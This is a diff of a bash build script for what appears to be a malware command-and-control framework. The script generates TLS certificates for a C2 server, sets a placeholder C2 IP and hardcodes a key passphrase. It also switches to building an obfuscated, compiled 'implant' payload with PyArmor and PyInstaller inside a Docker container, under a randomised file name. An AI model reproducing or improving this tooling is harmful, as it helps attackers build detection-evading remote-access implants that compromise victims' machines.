@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 CERT_DIR=cert
 SUBJECT="/C=US/ST=CA/L=SanFrancisco/O=ZeroTen"
+C2_IP="127.0.0.1" # change this to your c2 ip
 
 # create uploads folder and derived key used by c2
 mkdir -p uploads
@@ -28,7 +29,7 @@ subjectAltName = @alt_names
 
 [alt_names]
 IP.1 = 127.0.0.1
-# add your C2 IPs here as "IP.N = AAA.BBB.CCC.DDD"
+IP.2 = "$C2_IP"
 DNS.1 = localhost
 EOF
 
@@ -42,23 +43,16 @@ openssl req -x509 -newkey rsa:4096 -keyout "${CERT_DIR}/key.pem" \
     -out "${CERT_DIR}/cert.pem" -sha256 -days 365 -subj "$SUBJECT" \
     -passout pass:sB3oIHwVTtvs5HjDBis0X2Jxq1Lp-TiVmgwgyfgwqDI
 
+# obfuscate and compile payload in docker container
+SCRIPT_NAME="d-ISkvI.py" # implant name in docker container, not in this repo
+BINARY_NAME="${SCRIPT_NAME%.py}"
 
-# obfuscate implant
-pyarmor gen implant.py
+docker build -f pyinstaller-dockerfile -t pyinstaller-alpine .
 
-# compile obfuscated implant
-pyinstaller --onefile --name payload \
-    --hidden-import=json \
-    --hidden-import=requests \
-    --hidden-import=cryptography \
-    --hidden-import=cryptography.hazmat.primitives.asymmetric.x25519 \
-    --hidden-import=cryptography.hazmat.primitives.kdf.hkdf \
-    --hidden-import=cryptography.hazmat.primitives.hashes \
-    --hidden-import=cryptography.hazmat.primitives.ciphers.aead \
-    --hidden-import=cryptography.hazmat.primitives.serialization \
-    --hidden-import=cryptography.hazmat.backends.openssl.backend \
-    --hidden-import=cryptography.hazmat.bindings._rust \
-    --hidden-import=cryptography.hazmat.bindings._openssl \
-    dist/implant.py
+# run container and copy output binary to dist
+docker run --rm -v "$(pwd)/dist:/output" pyinstaller-alpine \
+  cp "/app/dist/${BINARY_NAME}" "/output/"
 
-echo [*] obfuscated and compiled implant saved to dist/payload
+echo
+echo "[*] saved certificates and keys to ${CERT_DIR}/"
+echo "[*] obfuscated and compiled implant saved to dist/$BINARY_NAME"
